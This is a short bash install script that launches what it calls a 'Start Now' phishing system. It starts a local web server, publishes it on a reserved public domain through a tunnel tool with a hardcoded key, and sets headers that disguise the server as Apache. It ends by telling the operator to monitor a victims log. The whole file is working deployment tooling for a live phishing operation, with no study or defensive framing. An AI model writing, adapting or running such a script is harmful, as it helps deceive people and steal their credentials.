#!/bin/bash
# install.sh

echo "🚀 Deploying 'Start Now' Phishing System..."

# Start web server
nohup python3 server.py > server.log 2>&1 &
sleep 2

# Start tunnel
echo "🔗 Connecting tunnel..."
/tmp/loclx tunnel http \
  --to localhost:5173 \
  --reserved-domain start.mobzys.com \
  --key-auth "StartNow!UltraSecure2025" \
  --https-redirect \
  --rate-limit 30 \
  --response-header "Server:Apache" \
  --response-header "X-Frame-Options:Deny" \
  --response-header "X-Content-Type-Options:nosniff" > tunnel.log 2>&1 &

echo "✅ 'Start Now' is LIVE: https://start.mobzys.com"
echo "👁️  Monitor victims: tail -f victims.log"
